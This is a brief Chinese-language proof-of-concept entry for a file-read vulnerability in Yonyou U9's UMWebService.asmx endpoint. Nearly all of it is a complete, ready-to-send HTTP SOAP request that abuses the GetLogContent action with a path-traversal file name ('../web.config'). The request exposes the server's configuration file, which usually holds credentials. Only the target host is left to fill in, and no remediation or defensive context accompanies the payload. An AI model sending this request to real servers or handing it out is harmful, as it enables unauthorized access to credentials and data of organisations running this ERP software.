## 用友U9-UMWebService.asmx存在文件读取漏洞

## poc
```
POST /u9/OnLine/UMWebService.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36
Connection: close
Content-Length: 381
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetLogContent"
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetLogContent xmlns="http://tempuri.org/">
      <fileName>../web.config</fileName>
    </GetLogContent>
  </soap:Body>
</soap:Envelope>
```
